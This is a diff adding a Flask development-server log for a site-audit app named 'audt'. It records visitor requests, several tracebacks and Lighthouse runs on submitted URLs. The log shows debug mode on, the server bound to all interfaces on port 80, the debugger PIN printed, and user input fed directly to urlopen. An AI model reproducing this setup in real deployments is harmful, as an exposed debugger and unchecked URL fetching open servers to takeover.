@@ -1,0 +1,1676 @@
+ * Serving Flask app "audt" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 188-240-224
+77.101.234.187 - - [01/Dec/2020 22:56:59] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:56:59] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:57:05] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:57:20] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:57:26] "[37mGET /report?report=89 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:57:33] "[37mGET /report?report=86 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:57:35] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:57:49] "[37mGET /report?report=51 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[35m[1mGET /report?report=6 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/24112020-10:24-techterms.json'
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:30] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:34] "[35m[1mGET /report?report=34 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/24112020-15:08-javierlopez.json'
+77.101.234.187 - - [01/Dec/2020 22:58:34] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:34] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:34] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:35] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:35] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:38] "[35m[1mGET /report?report=37 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/24112020-16:11-javierlopez.json'
+77.101.234.187 - - [01/Dec/2020 22:58:38] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:38] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:38] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:38] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:38] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:40] "[35m[1mGET /report?report=44 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/24112020-16:52-javierlopez.json'
+77.101.234.187 - - [01/Dec/2020 22:58:40] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:40] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:40] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:40] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:40] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:43] "[37mGET /report?report=63 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 22:58:51] "[37mGET /report?report=65 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:53] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:53] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:56] "[35m[1mGET /report?report=74 HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 135, in report
+    with open(path + filename) as json_file:
+FileNotFoundError: [Errno 2] No such file or directory: 'static/reports/01-12-2020-10:50-currys.json'
+77.101.234.187 - - [01/Dec/2020 23:02:56] "[37mGET /report?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:56] "[37mGET /report?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:56] "[37mGET /report?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:56] "[37mGET /report?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:56] "[37mGET /report?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:02:58] "[37mGET /report?report=75 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:03:18] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:03:19] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:03:21] "[37mGET /report?report=92 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:03:44] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:04:05] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:04:11] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:06:41] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:06:41] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:06:42] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:06:42] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:06:42] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:07:17] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:07:17] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:07:18] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:10:37] "[37mGET / HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:10:38] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:10:38] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:10:38] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:10:40] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:11:14] "[37mGET /list HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:11:34] "[37mGET /report?report=91 HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:11:53] "[37mGET / HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:12:18] "[37mGET / HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:12:29] "[37mGET /list HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:12:33] "[37mGET /report?report=79 HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:12:50] "[37mGET / HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:13:06] "[37mGET /list HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:13:08] "[37mGET / HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:13:09] "[37mGET /list HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:13:15] "[37mGET /report?report=92 HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:13:25] "[37mGET /report?report=91 HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:14:12] "[37mGET /list HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:14:15] "[37mGET /report?report=92 HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:14:25] "[37mGET / HTTP/1.1[0m" 200 -
+188.76.192.137 - - [01/Dec/2020 23:14:30] "[37mGET / HTTP/1.1[0m" 200 -
+192.241.234.8 - - [01/Dec/2020 23:16:55] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+77.101.234.187 - - [01/Dec/2020 23:26:08] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:08] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+77.101.234.187 - - [01/Dec/2020 23:26:08] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:08] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:08] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:09] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:13] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:20] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:20] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:21] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:26:21] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+35.237.4.214 - - [01/Dec/2020 23:26:25] "[37mGET / HTTP/1.1[0m" 200 -
+34.73.141.67 - - [01/Dec/2020 23:26:25] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:28:16] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:07] "[37mGET /list HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:11] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:16] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'hjjhj'
+77.101.234.187 - - [01/Dec/2020 23:29:16] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:16] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:16] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:17] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:31] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/FlaskApp/audt.py", line 38, in processurl
+    urlopen(urlRequested)
+  File "/usr/lib/python3.8/urllib/request.py", line 222, in urlopen
+    return opener.open(url, data, timeout)
+  File "/usr/lib/python3.8/urllib/request.py", line 509, in open
+    req = Request(fullurl, data)
+  File "/usr/lib/python3.8/urllib/request.py", line 328, in __init__
+    self.full_url = url
+  File "/usr/lib/python3.8/urllib/request.py", line 354, in full_url
+    self._parse()
+  File "/usr/lib/python3.8/urllib/request.py", line 383, in _parse
+    raise ValueError("unknown url type: %r" % self.full_url)
+ValueError: unknown url type: 'www.google.es'
+77.101.234.187 - - [01/Dec/2020 23:29:32] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:32] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:32] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:32] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:32] "[37mGET /processurl?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:41] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on http://www.google.es ...
+
+77.101.234.187 - - [01/Dec/2020 23:29:45] "[37mGET /processurl?data=93 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:48] "[37mGET /processurl?data=93 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:52] "[37mGET /processurl?data=93 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:29:55] "[37mGET /processurl?data=93 HTTP/1.1[0m" 200 -
+
+WARNING: The page may not be loading as expected because your test URL (http://www.google.es/) was redirected to https://www.google.es/?gws_rd=ssl. Try testing the second URL directly.
+
+
+77.101.234.187 - - [01/Dec/2020 23:29:59] "[32mGET /processurl?data=93 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [01/Dec/2020 23:29:59] "[37mGET /report?report=93 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:30:08] "[37mGET / HTTP/1.1[0m" 200 -
+77.68.114.98 - - [01/Dec/2020 23:30:23] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:30:23] "[37mPOST /processurl HTTP/1.1[0m" 200 -
+- Running Lighthouse on http://audt.javierlopez.design ...
+
+77.101.234.187 - - [01/Dec/2020 23:30:27] "[37mGET /processurl?data=94 HTTP/1.1[0m" 200 -
+77.68.114.98 - - [01/Dec/2020 23:30:27] "[37mGET / HTTP/1.1[0m" 200 -
+77.68.114.98 - - [01/Dec/2020 23:30:27] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+77.68.114.98 - - [01/Dec/2020 23:30:27] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+77.68.114.98 - - [01/Dec/2020 23:30:27] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+77.68.114.98 - - [01/Dec/2020 23:30:29] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+77.68.114.98 - - [01/Dec/2020 23:30:30] "[37mGET / HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:30:30] "[37mGET /processurl?data=94 HTTP/1.1[0m" 200 -
+77.101.234.187 - - [01/Dec/2020 23:30:34] "[32mGET /processurl?data=94 HTTP/1.1[0m" 302 -
+77.101.234.187 - - [01/Dec/2020 23:30:34] "[37mGET /report?report=94 HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:33:49] "[37mGET / HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:33:49] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:33:49] "[37mGET /static/images/logo.svg HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:33:49] "[37mGET /static/images/aboutuspic.jpg HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:33:49] "[37mGET /static/images/favicon.png HTTP/1.1[0m" 200 -
+109.246.20.26 - - [01/Dec/2020 23:34:49] "[35m[1mPOST /processurl HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/FlaskApp/FlaskAppEnv/lib/python3.8/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
